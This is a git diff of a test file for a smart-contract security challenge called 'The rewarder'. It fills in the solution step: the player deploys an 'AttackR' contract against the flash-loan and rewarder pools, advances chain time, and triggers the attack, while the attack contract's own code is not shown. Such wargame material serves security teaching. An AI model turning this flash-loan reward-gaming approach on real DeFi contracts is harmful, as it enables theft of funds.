@@ -1,10 +1,11 @@
-const { ethers } = require('hardhat');
+const { ethers } = require('hardhat'); 
 const { expect } = require('chai');
 
 describe('[Challenge] The rewarder', function () {
     const TOKENS_IN_LENDER_POOL = 1000000n * 10n ** 18n; // 1 million tokens
     let users, deployer, alice, bob, charlie, david, player;
     let liquidityToken, flashLoanPool, rewarderPool, rewardToken, accountingToken;
+    let attack;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -69,7 +70,10 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const AttackFactory = await ethers.getContractFactory('AttackR', player);
+        attack = await AttackFactory.deploy(player.address,rewarderPool.address,flashLoanPool.address,liquidityToken.address,rewardToken.address);
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+        await attack.kek();
     });
 
     after(async function () {
